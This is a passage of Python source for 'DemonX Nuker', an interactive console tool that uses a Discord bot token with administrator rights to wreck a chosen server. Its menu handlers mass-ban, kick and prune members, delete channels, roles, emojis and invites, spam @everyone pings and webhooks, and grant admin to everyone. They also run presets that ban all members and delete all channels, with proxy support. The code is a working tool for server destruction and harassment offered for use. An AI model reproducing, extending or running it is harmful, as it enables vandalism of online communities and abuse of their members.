        await self.prune_members(guild, days)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_mass_ping(self, guild: discord.Guild) -> None:
        """Handle mass ping menu option"""
        message_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Message: {Style.RESET_ALL}")).strip()
        message = message_input if message_input else "@everyone Nuked"
        count_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Quantity per channel (default: 5): {Style.RESET_ALL}")).strip()
        count = int(count_input) if count_input.isdigit() else 5
        await self.mass_ping(guild, message, count)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_create_roles(self, guild: discord.Guild) -> None:
        """Handle create roles menu option"""
        count_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Role count: {Style.RESET_ALL}")).strip()
        count = int(count_input) if count_input.isdigit() else 50
        name_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Role name (optional): {Style.RESET_ALL}")).strip()
        name = name_input if name_input else None
        await self.create_roles(guild, count, name)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_delete_roles(self, guild: discord.Guild) -> None:
        """Handle delete roles menu option"""
        await self.delete_roles(guild)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_delete_emojis(self, guild: discord.Guild) -> None:
        """Handle delete emojis menu option"""
        await self.delete_emojis(guild)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_create_categories(self, guild: discord.Guild) -> None:
        """Handle create categories menu option"""
        count_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Category count: {Style.RESET_ALL}")).strip()
        count = int(count_input) if count_input.isdigit() else 10
        name_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Category name (optional, random if empty): {Style.RESET_ALL}")).strip()
        name = name_input if name_input else None
        await self.create_categories(guild, count, name)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_rename_channels(self, guild: discord.Guild) -> None:
        """Handle rename channels menu option"""
        name = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] New channel name: {Style.RESET_ALL}")).strip()
        if name:
            await self.rename_channels(guild, name)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_rename_roles(self, guild: discord.Guild) -> None:
        """Handle rename roles menu option"""
        name = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] New role name: {Style.RESET_ALL}")).strip()
        if name:
            await self.rename_roles(guild, name)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_shuffle_channels(self, guild: discord.Guild) -> None:
        """Handle shuffle channels menu option"""
        await self.shuffle_channels(guild)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_unban_all(self, guild: discord.Guild) -> None:
        """Handle unban all members menu option"""
        await self.unban_all_members(guild)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_unban_member(self, guild: discord.Guild) -> None:
        """Handle unban specific member menu option"""
        user_id_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] User ID to unban: {Style.RESET_ALL}")).strip()
        if user_id_input.isdigit():
            await self.unban_member(guild, int(user_id_input))
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_mass_nickname(self, guild: discord.Guild) -> None:
        """Handle mass nickname menu option"""
        nickname_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Nickname (optional, random if empty): {Style.RESET_ALL}")).strip()
        nickname = nickname_input if nickname_input else None
        await self.mass_nickname(guild, nickname)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_grant_admin(self, guild: discord.Guild) -> None:
        """Handle grant admin menu option"""
        await self.grant_admin_all(guild)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_check_update(self, guild: discord.Guild) -> None:
        """Handle check update menu option"""
        print(f"{Fore.YELLOW}[*] Checking for updates...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] You are running the latest version!{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_credit(self, guild: discord.Guild) -> None:
        """Handle credit menu option"""
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  DemonX Nuker - Credits{Fore.CYAN}{' ' * 45}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Author: Kirito / Demon{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Version: Professional Edition{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_exit(self, guild: discord.Guild) -> None:
        """Handle exit menu option"""
        raise SystemExit("User requested exit")
    
    async def _handle_copy_role_perms(self, guild: discord.Guild) -> None:
        """Handle copy role permissions menu option"""
        source_id_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Source role ID: {Style.RESET_ALL}")).strip()
        target_id_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Target role ID: {Style.RESET_ALL}")).strip()
        if source_id_input.isdigit() and target_id_input.isdigit():
            source_role = guild.get_role(int(source_id_input))
            target_role = guild.get_role(int(target_id_input))
            if source_role and target_role:
                await target_role.edit(permissions=source_role.permissions)
                print(f"{Fore.GREEN}[+] Copied permissions from {source_role.name} to {target_role.name}{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_rename_guild(self, guild: discord.Guild) -> None:
        """Handle rename guild menu option"""
        name = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] New guild name: {Style.RESET_ALL}")).strip()
        if name:
            await guild.edit(name=name)
            print(f"{Fore.GREEN}[+] Guild renamed to {name}{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_modify_verify(self, guild: discord.Guild) -> None:
        """Handle modify verification level menu option"""
        print(f"{Fore.WHITE}1. None")
        print(f"{Fore.WHITE}2. Low")
        print(f"{Fore.WHITE}3. Medium")
        print(f"{Fore.WHITE}4. High")
        print(f"{Fore.WHITE}5. Very High")
        choice = await self._get_user_choice()
        level_map = {
            "1": discord.VerificationLevel.none,
            "2": discord.VerificationLevel.low,
            "3": discord.VerificationLevel.medium,
            "4": discord.VerificationLevel.high,
            "5": discord.VerificationLevel.highest
        }
        if choice in level_map:
            await self.modify_verification_level(guild, level_map[choice])
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_change_afk(self, guild: discord.Guild) -> None:
        """Handle change AFK timeout menu option"""
        timeout_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] AFK timeout (seconds): {Style.RESET_ALL}")).strip()
        if timeout_input.isdigit():
            await self.change_afk_timeout(guild, int(timeout_input))
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_delete_invites(self, guild: discord.Guild) -> None:
        """Handle delete invites menu option"""
        await self.delete_all_invites(guild)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_create_invites(self, guild: discord.Guild) -> None:
        """Handle create invites menu option"""
        count_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Invite count: {Style.RESET_ALL}")).strip()
        count = int(count_input) if count_input.isdigit() else 10
        await self.create_invites(guild, count)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_get_invites(self, guild: discord.Guild) -> None:
        """Handle get invites menu option"""
        invites = await self.get_all_invites(guild)
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  Server Invites ({len(invites)}){Fore.CYAN}{' ' * (49 - len(str(len(invites))))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        for invite in invites:
            print(f"{Fore.WHITE}  {invite.code} - {invite.url}{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_webhook_spam(self, guild: discord.Guild) -> None:
        """Handle webhook spam menu option"""
        message_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Message: {Style.RESET_ALL}")).strip()
        message = message_input if message_input else "Nuked"
        count_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Message count: {Style.RESET_ALL}")).strip()
        count = int(count_input) if count_input.isdigit() else 10
        await self.webhook_spam(guild, message, count)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_auto_react(self, guild: discord.Guild) -> None:
        """Handle auto react menu option"""
        emoji_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Emoji to react with: {Style.RESET_ALL}")).strip()
        emoji = emoji_input if emoji_input else "🔥"
        await self.auto_react_messages(guild, emoji)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_react_pinned(self, guild: discord.Guild) -> None:
        """Handle react to pinned messages menu option"""
        emoji_input = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Emoji to react with: {Style.RESET_ALL}")).strip()
        emoji = emoji_input if emoji_input else "💀"
        await self.react_to_pinned_messages(guild, emoji)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_execute_preset(self, guild: discord.Guild) -> None:
        """Handle execute preset menu option"""
        preset_name = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Preset name: {Style.RESET_ALL}")).strip()
        if preset_name:
            await self.execute_preset(guild, preset_name)
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_create_preset(self, guild: discord.Guild) -> None:
        """Handle create preset menu option"""
        preset_name = (await asyncio.to_thread(input, f"{Fore.CYAN}[?] Preset name: {Style.RESET_ALL}")).strip()
        if preset_name:
            # Check if preset already exists
            if preset_name in self.preset_manager.list_presets():
                overwrite = (await asyncio.to_thread(input, f"{Fore.YELLOW}[!] Preset '{preset_name}' already exists. Overwrite? (y/n): {Style.RESET_ALL}")).strip().lower()
                if overwrite != 'y':
                    print(f"{Fore.YELLOW}[*] Cancelled{Style.RESET_ALL}")
                    await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                    return
            
            # Create a basic template preset
            template = [
                {
                    "type": "ban_all",
                    "params": {"reason": "Nuked"}
                },
                {
                    "type": "delete_channels",
                    "params": {}
                }
            ]
            
            self.preset_manager.create_preset(preset_name, template)
            print(f"{Fore.GREEN}[+] Created preset '{preset_name}' with template operations{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Edit presets.json to customize the preset operations{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_list_presets(self, guild: discord.Guild) -> None:
        """Handle list presets menu option"""
        presets = self.preset_manager.list_presets()
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  Available Presets ({len(presets)}){Fore.CYAN}{' ' * (47 - len(str(len(presets))))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        for preset in presets:
            print(f"{Fore.WHITE}  - {preset}{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_statistics(self, guild: discord.Guild) -> None:
        """Handle statistics menu option"""
        self.print_statistics()
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    async def _handle_history(self, guild: discord.Guild) -> None:
        """Handle history menu option"""
        history = self.operation_history.history  # Use history attribute directly
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  Operation History ({len(history)} entries){Fore.CYAN}{' ' * (40 - len(str(len(history))))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        for record in history[-20:]:  # Show last 20 entries
            operation_type = record.operation_type.value if hasattr(record.operation_type, 'value') else str(record.operation_type)
            print(f"{Fore.WHITE}  {operation_type} - {record.timestamp}{Style.RESET_ALL}")
        await asyncio.to_thread(input, f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def _get_menu_handlers(self) -> Dict[str, Coroutine]:
        """Get menu option handlers mapping
        
        Returns:
            Dictionary mapping menu choice strings to handler coroutines
        """
        handlers = {
            "1": self._handle_ban_members,
            "01": self._handle_ban_members,  # Support both formats
            "2": self._handle_delete_channels,
            "02": self._handle_delete_channels,  # Support both formats
            "3": self._handle_kick_members,
            "03": self._handle_kick_members,  # Support both formats
            "4": self._handle_prune,
            "5": self._handle_create_channels,
            "6": self._handle_mass_ping,
            "7": self._handle_create_roles,
            "8": self._handle_delete_roles,
            "9": self._handle_delete_emojis,
            "10": self._handle_create_categories,
            "11": self._handle_rename_channels,
            "12": self._handle_rename_roles,
            "13": self._handle_shuffle_channels,
            "14": self._handle_unban_all,
            "15": self._handle_unban_member,
            "16": self._handle_mass_nickname,
            "17": self._handle_grant_admin,
            "18": self._handle_check_update,
            "19": self._handle_credit,
            "20": self._handle_exit,
            "21": self._handle_copy_role_perms,
            "22": self._handle_rename_guild,
            "23": self._handle_modify_verify,
            "24": self._handle_change_afk,
            "25": self._handle_delete_invites,
            "26": self._handle_create_invites,
            "27": self._handle_get_invites,
            "28": self._handle_webhook_spam,
            "29": self._handle_auto_react,
            "30": self._handle_react_pinned,
            "31": self._handle_execute_preset,
            "32": self._handle_create_preset,
            "33": self._handle_list_presets,
            "34": self._handle_statistics,
            "35": self._handle_history,
            "0": self._handle_exit,
            "00": self._handle_exit,
        }
        
        # Add queue handlers if available
        if QUEUE_AVAILABLE:
            handlers["37"] = self._handle_queue_operations
            handlers["38"] = self._handle_view_queue
            handlers["39"] = self._handle_clear_queue
        
        return handlers
    
    async def _display_menu(self) -> None:
        """Display the main menu interface"""
        # Clear screen and show menu
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Print banner
        print_banner()
        
        # Menu options in 5 columns - Sequential order
        menu_data = [
            [("[01]", "BAN MEMBERS"), ("[02]", "DELETE CHANNELS"), ("[03]", "KICK MEMBERS"), ("[04]", "PRUNE"), ("[05]", "CREATE CHANNELS")],
            [("[06]", "MASS PING"), ("[07]", "CREATE ROLES"), ("[08]", "DELETE ROLES"), ("[09]", "DELETE EMOJIS"), ("[10]", "CREATE CATEGORIES")],
            [("[11]", "RENAME CHANNELS"), ("[12]", "RENAME ROLES"), ("[13]", "SHUFFLE CHANNELS"), ("[14]", "UNBAN ALL"), ("[15]", "UNBAN MEMBER")],
            [("[16]", "MASS NICK"), ("[17]", "GRANT ADMIN"), ("[18]", "CHECK UPDATE"), ("[19]", "CREDIT"), ("[20]", "EXIT")],
            [("[21]", "COPY ROLE PERMS"), ("[22]", "RENAME GUILD"), ("[23]", "MODIFY VERIFY"), ("[24]", "CHANGE AFK"), ("[25]", "DELETE INVITES")],
            [("[26]", "CREATE INVITES"), ("[27]", "GET INVITES"), ("[28]", "WEBHOOK SPAM"), ("[29]", "AUTO REACT"), ("[30]", "REACT PINNED")],
            [("[31]", "EXECUTE PRESET"), ("[32]", "CREATE PRESET"), ("[33]", "LIST PRESETS"), ("[34]", "STATISTICS"), ("[35]", "HISTORY")],
            [("[00]", "EXIT"), ("", ""), ("", ""), ("", ""), ("", "")],
        ]
        
        # Add queue options if available
        if QUEUE_AVAILABLE:
            menu_data.append([("[37]", "QUEUE OPS"), ("[38]", "VIEW QUEUE"), ("[39]", "CLEAR QUEUE"), ("", ""), ("", "")])
        
        # Print menu in columns
        print()  # Add blank line before menu
        for row in menu_data:
            line_items = []
            for num, text in row:
                if num and text:
                    line_items.append(f"{Fore.MAGENTA}{num}{Fore.CYAN} {text}{Style.RESET_ALL}")
            
            # Print the line if it has any items
            if line_items:
                # Format with proper spacing (22 chars per item)
                formatted_line = "".join(f"{item:<22}" for item in line_items)
                print(formatted_line)
        print()  # Add blank line after menu
        
        # Warning message
        print(f"\n{Fore.MAGENTA}!! NUKERS ARE BREAKING THE SYSTEM FOR PROFIT !!{Style.RESET_ALL}\n")
        
        # Get current time for timestamp
        current_time = time.strftime("%H:%M:%S")
        
        # Input prompt
        print(f"{Fore.WHITE}{current_time}")
        print(f"{Fore.RED}INP{Style.RESET_ALL} {Fore.WHITE}•{Style.RESET_ALL} {Fore.RED}OPTION{Style.RESET_ALL}")
                
    async def _get_user_choice(self) -> str:
        """Get user menu choice input
        
        Returns:
            User's menu choice as string
        """
        choice = await asyncio.to_thread(input, f"{Fore.WHITE}>{Style.RESET_ALL} ")
        return choice.strip()
    
    async def run_menu(self, guild: discord.Guild) -> None:
        """Run interactive menu in background (non-blocking)
        
        Main menu loop that displays options and handles user input.
        Uses a command pattern with handler methods for each menu option.
        
        Args:
            guild: The Discord guild to perform operations on
        """
        handlers = self._get_menu_handlers()
        
        while True:
            try:
                # Display menu and get user choice
                await self._display_menu()
                choice = await self._get_user_choice()
                
                try:
                    # Use command pattern - get handler from mapping
                    handler = handlers.get(choice)
                    if handler:
                        # Execute handler with guild parameter
                        await handler(guild)
                    else:
                        # Invalid choice
                        print(f"\n{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.RED}║{Fore.WHITE}  [!] Invalid Choice! Please select a valid option.{Fore.RED}{' ' * 9}║")
                        print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                        await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                except SystemExit:
                    # Exit requested by user
                    # Stop queue processor and config watcher
                    if hasattr(self, 'operation_queue') and self.operation_queue:
                        try:
                            self.operation_queue.stop_processing()
                        except Exception:
                            pass
                    if hasattr(self, '_config_watch_enabled'):
                        self._config_watch_enabled = False
                    break
                except ValueError as e:
                    print(f"\n{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] Invalid Input: {str(e)[:50]}{Fore.RED}{' ' * (45 - min(50, len(str(e))))}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                    await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                except Exception as e:
                    print(f"\n{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] Error: {str(e)[:50]}{Fore.RED}{' ' * (50 - min(50, len(str(e))))}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                    logger.error(f"Error in menu: {e}", exc_info=True)
                    import traceback
                    traceback.print_exc()
                    await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Fatal error in menu: {e}")
                logger.error(f"Fatal error in menu: {e}", exc_info=True)
                break
    
    async def run(self):
        """Run the bot"""
        try:
            # Use private token and clear it after bot starts
            token = self._token
            await self.bot.start(token)
            # Clear token from memory after use (best effort)
            self._token = None
            del token
        except discord.LoginFailure as e:
            error_msg = get_user_friendly_error(e)
            print(f"{Fore.RED}[!] {error_msg}")
            print(f"{Fore.YELLOW}[*] Press any key to exit...")
            input()
        except Exception as e:
            logger.error(f"Error running bot: {e}")
            print(f"{Fore.RED}[!] Fatal error: {e}")
            print(f"{Fore.YELLOW}[*] Press any key to exit...")
            input()

# User-friendly error messages
# ERROR_MESSAGES, get_user_friendly_error, load_config, and print_banner
# are now imported from demonx package

async def main():
    """Main function"""
    print_banner()
    
    # Load and validate config
    config = load_config()
    use_proxy = config.get('proxy', False)
    dry_run = config.get('dry_run', False)
    
    # Get token
    try:
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  Authentication Required{Fore.CYAN}{' ' * 44}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        token_input = input(f"{Fore.CYAN}║ {Fore.YELLOW}Token{Fore.CYAN}: {Style.RESET_ALL}").strip()
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        if not token_input:
            print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║{Fore.WHITE}  [!] Token Required!{Fore.RED}{' ' * 47}║")
            print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            input("Press Enter to exit...")
            return
        
        # Validate token format using class method
        try:
            token = DemonXComplete.validate_token(token_input)
        except ValueError as e:
            print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║{Fore.WHITE}  [!] Invalid Token Format: {str(e)[:45]}{Fore.RED}{' ' * (45 - min(45, len(str(e))))}║")
            print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            input("Press Enter to exit...")
            return
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Fore.YELLOW}[!] Cancelled by user")
        input("Press Enter to exit...")
        return
    
    # Create nuker
    try:
        nuker = DemonXComplete(token, use_proxy, dry_run)
        if use_proxy and nuker.proxy_manager:
            proxy_count = len(nuker.proxy_manager.proxies)
            if proxy_count > 0:
                print(f"{Fore.CYAN}║{Fore.GREEN}  [+] Proxy Support Enabled: {proxy_count} proxies loaded{Fore.CYAN}{' ' * (25 - len(str(proxy_count)))}║")
            else:
                print(f"{Fore.CYAN}║{Fore.YELLOW}  [!] Proxy enabled but no proxies found in proxies.txt{Fore.CYAN}{' ' * 15}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Error creating nuker: {e}")
        logger.error(f"Error creating nuker: {e}", exc_info=True)
        input("Press Enter to exit...")
        return
    
    # Validate token (skip actual validation, will be done on connect)
    print(f"{Fore.CYAN}{'═'*70}")
    print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Validating token on connection...{Fore.CYAN}{' ' * 30}║")
    print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    # Get and validate guild ID using class method
    try:
        print(f"{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{Style.BRIGHT}  Guild Selection{Fore.CYAN}{' ' * 52}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        guild_id_input = input(f"{Fore.CYAN}║ {Fore.YELLOW}Guild ID{Fore.CYAN}: {Style.RESET_ALL}").strip()
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        guild_id = DemonXComplete.validate_guild_id(guild_id_input)
    except (ValueError, EOFError, KeyboardInterrupt) as e:
        if isinstance(e, (EOFError, KeyboardInterrupt)):
            print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║{Fore.WHITE}  [!] Cancelled by user!{Fore.RED}{' ' * 43}║")
            print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║{Fore.WHITE}  [!] Invalid Guild ID: {str(e)[:43]}{Fore.RED}{' ' * (43 - min(43, len(str(e))))}║")
            print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        input("Press Enter to exit...")
        return
    
    # Wait for ready
    @nuker.bot.event
    async def on_ready():
        try:
            if nuker.bot.user:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*70}")
                print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Connection Established{Fore.CYAN}{' ' * 41}║")
                print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}BOT INFORMATION{Fore.CYAN} {'─' * 49}┐")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Bot Username:{Fore.CYAN}{' ' * 50}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {nuker.bot.user}{Fore.CYAN}{' ' * (60 - len(str(nuker.bot.user)))}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Connected Guilds:{Fore.CYAN}{' ' * 46}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {len(nuker.bot.guilds)}{Fore.CYAN}{' ' * (60 - len(str(len(nuker.bot.guilds))))}│")
                print(f"{Fore.CYAN}└{'─' * 68}┘\n")
                
                guild = nuker.bot.get_guild(guild_id)
                if not guild:
                    print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] Guild Not Found!{Fore.RED}{' ' * 46}║")
                    print(f"{Fore.RED}║{Fore.YELLOW}  [*] Make sure the bot is in the guild{Fore.RED}{' ' * 25}║")
                    print(f"{Fore.RED}║{Fore.YELLOW}  [*] Verify the Guild ID is correct{Fore.RED}{' ' * 26}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                    input("Press any key to exit...")
                    await nuker.bot.close()
                    return
                
                print(f"{Fore.CYAN}┌─ {Fore.GREEN}{Style.BRIGHT}GUILD INFORMATION{Fore.CYAN} {'─' * 48}┐")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Guild Name:{Fore.CYAN}{' ' * 52}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {guild.name}{Fore.CYAN}{' ' * (60 - len(guild.name))}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Guild ID:{Fore.CYAN}{' ' * 54}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {guild.id}{Fore.CYAN}{' ' * (60 - len(str(guild.id)))}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}  {Fore.GREEN}✓ Member Count:{Fore.CYAN}{' ' * 49}│")
                print(f"{Fore.CYAN}│{Fore.WHITE}    {Fore.YELLOW}→ {guild.member_count}{Fore.CYAN}{' ' * (60 - len(str(guild.member_count)))}│")
                print(f"{Fore.CYAN}└{'─' * 68}┘\n")
                
                # Validate permissions
                if not await nuker.validate_permissions(guild):
                    error_msg = get_user_friendly_error(discord.Forbidden(None, "administrator"))
                    print(f"{Fore.RED}{Style.BRIGHT}╔═══════════════════════════════════════════════════════════════╗")
                    print(f"{Fore.RED}║{Fore.WHITE}  [!] {error_msg[:60]}{Fore.RED}{' ' * (60 - min(60, len(error_msg)))}║")
                    print(f"{Fore.RED}║{Fore.YELLOW}  [*] Bot needs Administrator permissions{Fore.RED}{' ' * 23}║")
                    print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                    await asyncio.to_thread(input, f"{Fore.YELLOW}Press Enter to exit...{Style.RESET_ALL}")
                    await nuker.bot.close()
                    return
                
                # Start queue processor if available
                if QUEUE_AVAILABLE and nuker.operation_queue:
                    try:
                        nuker.operation_queue.start_processing(guild)
                        logger.info("Queue processor started")
                    except Exception as e:
                        logger.warning(f"Failed to start queue processor: {e}")
                
                print(f"{Fore.CYAN}{'═'*70}")
                print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Initialization Complete - Loading Menu...{Fore.CYAN}{' ' * 20}║")
                print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
                await asyncio.sleep(1)
                
                # Start menu in background task
                asyncio.create_task(nuker.run_menu(guild))
        except Exception as e:
            print(f"{Fore.RED}[!] Error in on_ready: {e}")
            logger.error(f"Error in on_ready: {e}", exc_info=True)
            print(f"{Fore.YELLOW}[*] Press any key to exit...")
            input()
            await nuker.bot.close()
            return
    
    # Setup graceful shutdown handlers
    def setup_signal_handlers(nuker_instance):
        """Setup signal handlers for graceful shutdown"""
        def signal_handler(signum, frame):
            signal_name = signal.Signals(signum).name
            logger.info(f"Received signal {signal_name} ({signum}), shutting down gracefully...")
